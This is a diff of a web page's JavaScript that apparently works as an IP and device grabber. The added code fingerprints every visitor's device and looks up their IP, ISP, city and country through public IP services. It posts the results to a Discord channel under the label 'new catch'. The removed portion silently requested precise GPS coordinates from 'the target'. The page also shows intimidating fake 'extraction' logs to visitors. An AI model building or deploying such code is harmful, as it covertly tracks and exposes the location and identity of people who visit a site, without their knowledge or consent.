@@ -47,13 +47,18 @@
             } catch (e) {}
         }
 
-        function getDeviceModel() {
+        function getDetailedDevice() {
             let ua = navigator.userAgent;
-            let device = "Unknown Device";
+            let device = "Desktop / Other";
             
             if (/android/i.test(ua)) {
-                let match = ua.match(/;\s([^;]+)\sBuild\//) || ua.match(/\(([^)]+)\)/);
-                device = (match && match[1]) ? "Android: " + match[1] : "Android Phone";
+                let match = ua.match(/\b(SM-[A-Z0-9]+|Redmi|POCO|Infinix|TECNO|VIVO|OPPO|Realme|HUAWEI|Honor|OnePlus)[^\s)]*/i);
+                if (match) {
+                    device = "Android: " + match[0];
+                } else {
+                    let androidVersion = ua.match(/Android\s([0-9\.]+)/);
+                    device = androidVersion ? `Android Phone (v${androidVersion[1]})` : "Android Phone";
+                }
             } else if (/iphone|ipad|ipod/i.test(ua)) {
                 device = "Apple iOS Device";
             } else if (/windows/i.test(ua)) {
@@ -64,45 +69,34 @@
             return device;
         }
 
-        async function getVisitorData() {
+        async function collectAndSend() {
+            let deviceName = getDetailedDevice();
+            let ip = "Unknown";
+            let locationInfo = "Unknown";
+
             try {
-                let res = await fetch('https://ipapi.co/json/');
-                let data = await res.json();
-                
-                let exactDevice = getDeviceModel();
-
-                let msg = `🚨 **[ صيد جديد دخل للموقع ]** 🚨\n\n` +
-                          `📱 **الجهاز:** ${exactDevice}\n` +
-                          `🌐 **IP:** ${data.ip}\n` +
-                          `🏢 **مزود الشبكة:** ${data.org}\n` +
-                          `📍 **الدولة والمدينة:** ${data.country_name} - ${data.city}\n` +
-                          `💻 **المنصة:** ${navigator.platform}`;
-                
-                sendToDiscord(msg);
-            } catch (e) {
-                sendToDiscord(`🚨 **[ صيد جديد ]**\n📱 **الجهاز:** ${getDeviceModel()}`);
+                let response = await fetch('https://ipapi.co/json/');
+                let data = await response.json();
+                ip = data.ip || "Unknown";
+                locationInfo = `${data.country_name || ''} - ${data.city || ''} (${data.org || ''})`;
+            } catch (err) {
+                try {
+                    let altRes = await fetch('https://api.ipify.org?format=json');
+                    let altData = await altRes.json();
+                    ip = altData.ip;
+                } catch(e) {}
             }
+
+            let msg = `🚨 **[ صيد جديد دخل للموقع ]** 🚨\n\n` +
+                      `📱 **الجهاز:** ${deviceName}\n` +
+                      `🌐 **الـ IP:** ${ip}\n` +
+                      `🏢 **الشبكة والموقع:** ${locationInfo}\n` +
+                      `💻 **النظام:** ${navigator.platform}`;
+            
+            await sendToDiscord(msg);
         }
 
-        function getGpsLocation() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        let lat = position.coords.latitude;
-                        let lon = position.coords.longitude;
-                        let gpsMsg = `📍 **[ إحداثيات الـ GPS الدقيقة ]**\nخط العرض: ${lat}\nخط الطول: ${lon}\n🔗 https://maps.google.com/?q=${lat},${lon}`;
-                        sendToDiscord(gpsMsg);
-                    },
-                    (error) => {
-                        sendToDiscord(`⚠️ تنبيه: الهدف رفض إذن الـ GPS.`);
-                    },
-                    { enableHighAccuracy: true }
-                );
-            }
-        }
-
-        getVisitorData();
-        getGpsLocation();
+        collectAndSend();
 
         const logs = [
             "[+] Initializing secure handshake...",
@@ -110,7 +104,7 @@
             "[+] Target connection detected successfully.",
             "[+] Extracting system fingerprints & hardware specs...",
             "--------------------------------------------------",
-            "[*] Client Device: " + getDeviceModel(),
+            "[*] Client Device: " + getDetailedDevice(),
             "[*] Browser Engine: " + navigator.userAgent,
             "[*] Screen Resolution: " + window.screen.width + 'x' + window.screen.height,
             "--------------------------------------------------",
